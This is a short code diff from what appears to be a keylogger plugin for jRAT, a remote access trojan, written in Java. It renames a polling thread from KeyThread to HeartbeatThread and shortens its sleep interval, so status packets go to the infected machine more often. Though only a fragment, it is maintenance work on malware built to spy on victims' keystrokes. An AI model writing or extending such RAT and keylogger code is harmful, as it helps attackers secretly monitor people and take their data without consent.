@@ -7,14 +7,14 @@ import java.util.Random;
 import pro.jrat.api.PacketBuilder;
 import pro.jrat.api.RATObject;
 
-public class KeyThread implements Runnable {
+public class HeartbeatThread implements Runnable {
 
 	private boolean enabled = true;
 
 	private RATObject server;
 	private PanelKeylogger panel;
 
-	public KeyThread(RATObject server, PanelKeylogger panel) {
+	public HeartbeatThread(RATObject server, PanelKeylogger panel) {
 		this.server = server;
 		this.panel = panel;
 	}
@@ -23,7 +23,7 @@ public class KeyThread implements Runnable {
 	public void run() {
 		while (enabled) {
 			try {
-				Thread.sleep(5000L);
+				Thread.sleep(1000L);
 
 				server.addToSendQueue(new PacketBuilder(Plugin.STATUS_HEADER, server) {
 					@Override
